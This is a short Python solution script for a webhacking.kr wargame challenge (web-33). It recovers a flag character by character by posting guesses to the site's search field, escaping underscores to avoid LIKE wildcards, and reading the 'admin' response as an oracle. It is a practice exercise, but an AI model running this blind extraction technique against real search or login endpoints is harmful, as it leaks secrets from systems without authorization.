import requests
import string

url = "https://webhacking.kr/challenge/web-33/"


password = "FLAG{"
found = False
while not found:    
    for c in string.ascii_letters+string.digits+"_"+"{"+"}"+"-"+"?":
        response = requests.post(url, data={"search": (password+c).replace("_", r"\_")})
        if "admin" in response.text:
            password += c
            if c == '}':
                print("final password: {}".format(password))
                found = True
            else:
                print(password)
            break
